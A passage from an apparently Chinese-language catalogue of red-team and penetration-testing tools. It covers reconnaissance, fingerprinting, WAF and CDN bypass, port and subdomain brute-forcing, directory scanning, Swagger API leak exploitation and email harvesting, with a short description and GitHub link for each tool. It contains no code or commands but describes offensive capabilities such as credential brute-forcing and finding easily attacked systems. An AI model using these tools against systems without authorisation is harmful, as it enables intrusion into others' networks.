&lt;h3 id=&#34;enscan_go&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#enscan_go&#34;&gt;#&lt;/a&gt; ENScan_GO&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款基于各大企业信息 API 的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司 ICP 备案、APP、小程序、微信公众号等信息聚合导出。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3dncHNlYy9FTlNjYW5fR08=&#34;&gt;https://github.com/wgpsec/ENScan_GO&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;reconftw&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reconftw&#34;&gt;#&lt;/a&gt; ReconFTW&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ReconFTW 为您自动化侦察的整个过程。它比子域枚举以及各种漏洞检查和获取关于目标的最大信息的工作更出色。该工具使用了很多技术 (被动，蛮力，排列，证书透明，源代码抓取，分析，DNS 记录等) 用于子域枚举，帮助你获得最大和最有趣的子域，使你在竞争中领先。它还执行各种漏洞检查，如 XSS、打开重定向、SSRF、CRLF、LFI、SQLi、SSL 测试、SSTI、DNS 区域传输等等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NpeDJkZXovcmVjb25mdHc=&#34;&gt;https://github.com/six2dez/reconftw&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;dismap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dismap&#34;&gt;#&lt;/a&gt; dismap&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Dismap 定位是一个适用于内外网的资产发现和识别工具；其特色功能在于快速识别 Web 指纹信息，定位资产类型。辅助红队快速定位目标资产信息，辅助蓝队发现疑似脆弱点。&lt;br /&gt;
Dismap 拥有完善的指纹规则库，可轻松自定义新识别规则。&lt;br /&gt;
识别结果可直接丢给 Vulmap (&amp;gt;=0.8) 进行漏洞扫描实现简易联动。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3poenlrZXIvZGlzbWFw&#34;&gt;https://github.com/zhzyker/dismap&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;waf识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf识别&#34;&gt;#&lt;/a&gt; waf 识别&lt;/h2&gt;
&lt;h3 id=&#34;wafw00f&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wafw00f&#34;&gt;#&lt;/a&gt; wafw00f&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;waf 识别工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=&#34;&gt;https://github.com/EnableSecurity/wafw00f&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;waf-a-mole针对web应用防火墙的基于变异的模糊测试工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf-a-mole针对web应用防火墙的基于变异的模糊测试工具&#34;&gt;#&lt;/a&gt; WAF-A-MoLE：针对 Web 应用防火墙的基于变异的模糊测试工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;WAF-A-MoLE 是一款功能强大的基于变异的模糊测试工具，该工具可以帮助广大研究人员对基于 ML 的 Web 应用防火墙进行模糊测试。&lt;br /&gt;
只需提供一条 SQL 注入查询语句，该工具便能够尝试生成一个可绕过目标 WAF 的语义不变的变种查询。我们可以使用 WAF-A-MoLE 来探索解决方案空间，找到目标分类器未发现的危险 “盲点”，并且可以使用此工具评估产品的稳健性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0F2YWxaL1dBRi1BLU1vTEU=&#34;&gt;https://github.com/AvalZ/WAF-A-MoLE&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;指纹识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#指纹识别&#34;&gt;#&lt;/a&gt; 指纹识别&lt;/h2&gt;
&lt;h3 id=&#34;tidefinger&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tidefinger&#34;&gt;#&lt;/a&gt; TideFinger&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;TideFinger，一个开源的指纹识别小工具，使用了传统和现代检测技术相结合的指纹检测方法，让指纹检测更快捷、准确。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RpZGVTZWMvVGlkZUZpbmdlcg==&#34;&gt;https://github.com/TideSec/TideFinger&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;cms指纹识别-cmseek&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cms指纹识别-cmseek&#34;&gt;#&lt;/a&gt; CMS 指纹识别 - CMSeek&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款 cms 指纹识别工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1R1aGluc2h1YmhyYS9DTVNlZUs=&#34;&gt;https://github.com/Tuhinshubhra/CMSeeK&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;cms指纹识别-webfinger&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cms指纹识别-webfinger&#34;&gt;#&lt;/a&gt; CMS 指纹识别 - Webfinger&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;web 指纹识别&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NlNTVpMG4vV2ViZmluZ2Vy&#34;&gt;https://github.com/se55i0n/Webfinger&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;glass-指纹识别工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#glass-指纹识别工具&#34;&gt;#&lt;/a&gt; Glass - 指纹识别工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Glass 是一款针对资产列表的快速指纹识别工具，通过调用 Fofa/ZoomEye/Shodan/360 等 api 接口快速查询资产信息并识别重点资产的指纹，也可针对 IP/IP 段或资产列表进行快速的指纹识别。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3M3Y2tUZWFtL0dsYXNz&#34;&gt;https://github.com/s7ckTeam/Glass&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;ehole棱洞30-红队重点攻击系统指纹探测工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ehole棱洞30-红队重点攻击系统指纹探测工具&#34;&gt;#&lt;/a&gt; EHole (棱洞) 3.0 红队重点攻击系统指纹探测工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;EHole 是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统 (如 OA、VPN、Weblogic...)。EHole 旨在帮助红队人员在信息收集期间能够快速从 C 段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VkZ2VTZWN1cml0eVRlYW0vRUhvbGU=&#34;&gt;https://github.com/EdgeSecurityTeam/EHole&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;cdn识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cdn识别&#34;&gt;#&lt;/a&gt; CDN 识别&lt;/h2&gt;
&lt;h3 id=&#34;fuck-cdn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fuck-cdn&#34;&gt;#&lt;/a&gt; FUCK CDN&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;CDN 真实 IP 扫描&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RhaTdzeS9mdWNrY2Ru&#34;&gt;https://github.com/Tai7sy/fuckcdn&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;w8fuckcdn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#w8fuckcdn&#34;&gt;#&lt;/a&gt; w8fuckcdn&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;通过扫描全网绕过 CDN 获取网站 IP 地址&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JveS1oYWNrL3c4ZnVja2Nkbi8=&#34;&gt;https://github.com/boy-hack/w8fuckcdn/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h2&gt;
&lt;h3 id=&#34;跨平台小巧的端口爆破工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨平台小巧的端口爆破工具&#34;&gt;#&lt;/a&gt; 跨平台小巧的端口爆破工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一款跨平台小巧的端口爆破工具，支持爆破 FTP/SSH/SMB/MSSQL/MYSQL/POSTGRESQL/MONGOD。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2F3YWtlMXQvUG9ydEJydXRl&#34;&gt;https://github.com/awake1t/PortBrute&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;kscan-简单好用的资产测绘工具端口指纹存活自动探测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kscan-简单好用的资产测绘工具端口指纹存活自动探测&#34;&gt;#&lt;/a&gt; Kscan - 简单好用的资产测绘工具 | 端口指纹存活自动探测&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Kscan 是一款轻量级的资产发现工具，可针对 IP/IP 段或资产列表进行端口扫描以及 TCP 指纹识别和 Banner 抓取，在不发送更多的数据包的情况下尽可能的获取端口更多信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xjdnZ2di9rc2Nhbg==&#34;&gt;https://github.com/lcvvvv/kscan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;scaninfo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scaninfo&#34;&gt;#&lt;/a&gt; scaninfo&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;开源、轻量、快速、跨平台 的红队内外网打点扫描器。快速的端口扫描和服务识别比 masscan 更快。包含 fscan 的绝大部份功能除了 poc 扫描和自定义字典&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JlZHRvb2xza29iZS9zY2FuaW5mbw==&#34;&gt;https://github.com/redtoolskobe/scaninfo&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;域名扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域名扫描&#34;&gt;#&lt;/a&gt; 域名扫描&lt;/h2&gt;
&lt;h3 id=&#34;ksubdomain-子域爆破工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ksubdomain-子域爆破工具&#34;&gt;#&lt;/a&gt; ksubdomain - 子域爆破工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ksubdomain 是一款基于无状态的子域名爆破工具，类似无状态端口扫描，支持在 Windows/Linux/Mac 上进行快速的 DNS 爆破，拥有重发机制不用担心漏包。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JveS1oYWNrL2tzdWJkb21haW4=&#34;&gt;https://github.com/boy-hack/ksubdomain&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;oneforall&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oneforall&#34;&gt;#&lt;/a&gt; OneForAll&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;OneForAll 是一款功能强大的子域收集工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGw=&#34;&gt;https://github.com/shmilylty/OneForAll&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;subfinder-快速被动子域枚举工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#subfinder-快速被动子域枚举工具&#34;&gt;#&lt;/a&gt; subfinder - 快速被动子域枚举工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;子域名是一种子域名发现工具，通过使用被动在线资源发现网站的有效子域名。它具有简单的模块化架构，并针对速度进行了优化。子查找器仅用于执行一件事 - 被动子域枚举，并且它做得很好。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3Zlcnkvc3ViZmluZGVy&#34;&gt;https://github.com/projectdiscovery/subfinder&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;ksubdomain&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ksubdomain&#34;&gt;#&lt;/a&gt; ksubdomain&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ksubdomain 是一款基于无状态子域名爆破工具，支持在 Windows/Linux/Mac 上使用，它会很快的进行 DNS 爆破，在 Mac 和 Windows 上理论最大发包速度在 30w/s,linux 上为 160w/s 的速度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JveS1oYWNrL2tzdWJkb21haW4=&#34;&gt;https://github.com/boy-hack/ksubdomain&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;layer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#layer&#34;&gt;#&lt;/a&gt; Layer&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Layer 子域名挖掘机使用方法简单，在域名对话框中直接输入域名就可以进行扫描，它的显示界面比较细致，有域名、解析 IP、CDN 列表、WEB 服务器和网站状态&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGlrZWNzLmNvbS9zaG93LTIwMzM5NjI3OS5odG1s&#34;&gt;https://www.likecs.com/show-203396279.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;subdomainsbrute&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#subdomainsbrute&#34;&gt;#&lt;/a&gt; subDomainsBrute&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;subDomainsBrute 的特点是可以用小字典递归地发现三级域名、四级域名，甚至五级域名等不容易被探测到的域名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZS8=&#34;&gt;https://github.com/lijiejie/subDomainsBrute/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;sublist3r&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sublist3r&#34;&gt;#&lt;/a&gt; sublist3r&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Sublist3r 也是一个比较常用的工具，它能列举多种资源，如在 Google、Yahoo、Bing、Baidu 和 Ask 等搜索引擎中可查到的子域名，还可以列出 Netcraft、VirusTotal、ThreatCrowd、DNSdumpster 和 Reverse DNS 查到的子域名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Fib3VsM2xhL1N1Ymxpc3Qzci8=&#34;&gt;https://github.com/aboul3la/Sublist3r/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;dnsenum&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dnsenum&#34;&gt;#&lt;/a&gt; dnsenum&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;dnsenum 的目的是尽可能收集一个域的信息，它能够通过谷歌或者字典文件猜测可能存在的域名，并对一个网段进行反向查询。它不仅可以查询网站的主机地址信息、域名服务器和邮件交换记录，还可以在域名服务器上执行 axfr 请求，然后通过谷歌脚本得到扩展域名信息，提取子域名并查询，最后计算 C 类地址并执行 whois 查询，执行反向查询，把地址段写入文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Z3YWV5dGVucy9kbnNlbnVtLw==&#34;&gt;https://github.com/fwaeytens/dnsenum/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h2&gt;
&lt;h3 id=&#34;dirsearch&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dirsearch&#34;&gt;#&lt;/a&gt; dirsearch&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一种高级命令行工具，旨在暴力破解 Web 服务器中的目录和文件，AKA Web 路径扫描程序&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21hdXJvc29yaWEvZGlyc2VhcmNo&#34;&gt;https://github.com/maurosoria/dirsearch&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;crawler&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#crawler&#34;&gt;#&lt;/a&gt; Crawler&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一些爬虫 demo，比如用于渗透测试中 SQL 注入的 URL 收集脚本 (爬取必应和百度搜索结果的 URL)，子域名暴破，各大高校漏洞信息收集爬虫等，以及入门爬虫时写的一些基础代码等&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dnZmdoL0NyYXdsZXI=&#34;&gt;https://github.com/ggfgh/Crawler&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;jsfinder&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsfinder&#34;&gt;#&lt;/a&gt; JSFinder&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;JSFinder 是一款优秀的 github 开源工具，这款工具功能就是查找隐藏在 js 文件中的 api 接口和敏感目录，以及一些子域名。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RocmVlemgxL0pTRmluZGVy&#34;&gt;https://github.com/Threezh1/JSFinder&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;swagger-exp-信息泄露利用工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swagger-exp-信息泄露利用工具&#34;&gt;#&lt;/a&gt; swagger-exp -- 信息泄露利用工具&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;这是一个 Swagger REST API 信息泄露利用工具。主要功能有：&lt;br /&gt;
1、遍历所有 API 接口，自动填充参数&lt;br /&gt;
 2、尝试 GET / POST 所有接口，返回 Response Code / Content-Type / Content-Length ，用于分析接口是否可以未授权访问利用&lt;br /&gt;
 3、分析接口是否存在敏感参数，例如 url 参数，容易引入外网的 SSRF 漏洞&lt;br /&gt;
 4、检测 API 认证绕过漏洞&lt;br /&gt;
 5、在本地监听一个 Web Server，打开 Swagger UI 界面，供分析接口使用 &amp;gt; 6、使用 Chrome 打开本地 Web 服务器，并禁用 CORS，解决部分 API 接口无法跨域请求的问题&lt;br /&gt;
 7、当工具检测到 HTTP 认证绕过漏洞时，本地服务器拦截 API 文档，修改 path，以便直接在 Swagger UI 中进行测试&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N3YWdnZXItZXhw&#34;&gt;https://github.com/lijiejie/swagger-exp&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;arjun&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arjun&#34;&gt;#&lt;/a&gt; Arjun&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Arjun 拥有一个包含 10,985 个参数名的巨大默认字典，在 10 秒内通过发送 20-30 个请求，找到该网站有效的 HTTP 参数，在渗透测试的信息收集阶段起很重要的作用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9Bcmp1bg==&#34;&gt;https://github.com/s0md3v/Arjun&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;caesar&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#caesar&#34;&gt;#&lt;/a&gt; Caesar&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;文件扫描是安服的一个基本环节，网络上关于文件扫描的工具也有很多，比如御剑，7kbscan，dirsearch 等，但是在实战的时候还是遇到不少的问题，比如跨平台问题以及动态 404 问题。所以按照自己的经验重新造了一个轮子。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzBwcy9DYWVzYXI=&#34;&gt;https://github.com/0ps/Caesar&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;邮箱收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#邮箱收集&#34;&gt;#&lt;/a&gt; 邮箱收集&lt;/h2&gt;
&lt;h3 id=&#34;mailget&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mailget&#34;&gt;#&lt;/a&gt; Mailget&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;通过脉脉用户猜测企业邮箱&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JpZHRlci9tYWlsZ2V0&#34;&gt;https://github.com/ridter/mailget&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;infoga&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#infoga&#34;&gt;#&lt;/a&gt; Infoga&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Infoga 是一款能够在搜索引擎（Google、Bing、Shodan）和 PGP 密钥服务器等多种公共资源中搜集邮箱账户的工具。使用方法十分简单，看以下截图就一目了然了。这款工具对&lt;a href=&#34;http://www.52bug.cn/Security&#34;&gt;&lt;strong&gt;渗透&lt;/strong&gt;&lt;/a&gt;测试前期阶段的作用显而易见。我们也可以使用这款工具来查看自己公司在互联网上的曝光度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL200bGwway9pbmZvZ2E=&#34;&gt;https://github.com/m4ll0k/infoga&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;资产整理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资产整理&#34;&gt;#&lt;/a&gt; 资产整理&lt;/h2&gt;
&lt;h3 id=&#34;arl-资产安全灯塔&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arl-资产安全灯塔&#34;&gt;#&lt;/a&gt; ARL - 资产安全灯塔&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;快速发现并整理企业外网资产，构建资产信息库，协助甲方安全团队或者渗透测试人员快速找到企业资产中的薄弱点和攻击面。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RvcGhhbnRUZWNobm9sb2d5L0FSTA==&#34;&gt;https://github.com/TophantTechnology/ARL&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;sec-分布式资产安全扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sec-分布式资产安全扫描&#34;&gt;#&lt;/a&gt; SEC - 分布式资产安全扫描&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;SEC 可用于企业对服务器资源安全进行扫描排查，可控性强、可停止运行中的扫描任务、支持分布式多节点部署，更快的扫描进度 + 节点执行信息动态反馈，快速定位漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NtYWxsY2hhbS9zZWMtYWRtaW4=&#34;&gt;https://github.com/smallcham/sec-admin&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;w12scan-网络安全资产扫描引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#w12scan-网络安全资产扫描引擎&#34;&gt;#&lt;/a&gt; w12scan - 网络安全资产扫描引擎&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;w12scan 是一款网络资产发现引擎，通过 WEB 接口下发任务，w12scan 会自动将相关的资产聚合在一起方便分析使用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3ctZGlnaXRhbC1zY2FubmVyL3cxMnNjYW4=&#34;&gt;https://github.com/w-digital-scanner/w12scan&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;isee&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#isee&#34;&gt;#&lt;/a&gt; iSee&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;iSee 支持 FOFA 爬虫模式并能够在 fofa 搜索结果中提取整理资产信息，同时也是一款 SRC 挖掘神器，将 SRC 的资产信息黏贴到文本导入 iSee，得到的 b 段，c 段可以直接用 nmap, masscan 等工具进行扫描，有助于发现目标厂商的更多资产信息，尤其是防火墙，VPN 等设备的弱口令！ip 和域名可以直接导入 goby,awvs 等扫描器。&lt;br /&gt;
在 SRC 挖掘或者 hvv 红队视角下 iSee 旨在帮助渗透测试人员快速在信息收集得到的杂乱文本信息中整理出目标所有资产，以快速发现目标的脆弱资产。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3RyMHVibGUtbUFrZXIvaVNlZQ==&#34;&gt;https://github.com/tr0uble-mAker/iSee&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;arl-资产侦察灯塔系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arl-资产侦察灯塔系统&#34;&gt;#&lt;/a&gt; ARL - 资产侦察灯塔系统&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1RvcGhhbnRUZWNobm9sb2d5L0FSTA==&#34;&gt;https://github.com/TophantTechnology/ARL&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;漏洞检测利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞检测利用&#34;&gt;#&lt;/a&gt; 漏洞检测利用&lt;/h1&gt;
&lt;h2 id=&#34;脚本工具合集gui版&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#脚本工具合集gui版&#34;&gt;#&lt;/a&gt; 脚本工具合集 GUI 版&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;本项目的主要目的：针对日常收集的 Python POC\EXP 测试脚本，使用可视化界面统一执行入口，方便运行。本项目适合人群：有 Python 基础的渗透测试人员（工具自带简易编辑器，可修改脚本内参数，重新加载后可灵活使用脚本进行测试）。内置漏洞验证、利用模块，可自定义脚本实现批量验证。&lt;/p&gt;
&lt;/blockquote&gt;
